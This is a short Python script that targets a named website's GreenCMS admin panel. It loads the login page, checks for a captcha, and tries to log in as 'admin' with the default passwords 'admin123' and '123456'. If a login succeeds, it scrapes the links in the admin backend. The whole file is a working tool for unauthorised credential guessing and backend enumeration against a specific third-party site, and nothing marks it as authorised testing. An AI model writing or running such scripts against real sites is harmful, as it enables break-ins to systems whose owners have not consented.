#!/usr/bin/env python3
"""gz-dichuan GreenCMS backend menu enumeration"""
import urllib.request, urllib.parse, re, http.cookiejar

HOST = "http://gz-dichuan.com"
UA = {"User-Agent": "Mozilla/5.0"}
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def fetch(url, data=None, timeout=12):
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None,
                                     headers={**UA, "Content-Type": "application/x-www-form-urlencoded",
                                              "Referer": HOST + "/index.php?m=admin&c=login&a=index",
                                              "X-Requested-With": "XMLHttpRequest"})
        r = op.open(req, timeout=timeout)
        return r.status, r.geturl(), r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, url, e.read().decode("utf-8", "ignore")
    except Exception as ex:
        return 0, url, str(ex)

# 1. get login page
code, final, body = fetch(HOST + "/index.php?m=admin&c=login&a=index")
print("login page:", code, final, "size", len(body))
# find captcha and form fields
m = re.search(r'<img[^>]*src=["\']([^"\']*(captcha|code|verify)[^"\']*)["\']', body, re.I)
print("captcha url:", m.group(1) if m else "N/A")

# 2. try login without captcha first (GreenCMS may not require)
for pw in ["admin123", "123456"]:
    data = urllib.parse.urlencode({"username": "admin", "password": pw})
    code, final, resp = fetch(HOST + "/index.php?m=admin&c=login&a=index", data=data)
    print("login admin/%s -> %s %s size=%d" % (pw, code, final, len(resp)))
    if "成功" in resp or "index" in final and "login" not in final:
        print("  LOGIN OK with %s" % pw)
        break

# 3. get admin index
code, final, body = fetch(HOST + "/index.php?m=admin&c=index&a=index")
print("admin index:", code, final, "size", len(body))
links = re.findall(r'href=["\']([^"\']*admin[^"\']*)["\']', body, re.I)
print("admin links:", links[:20])
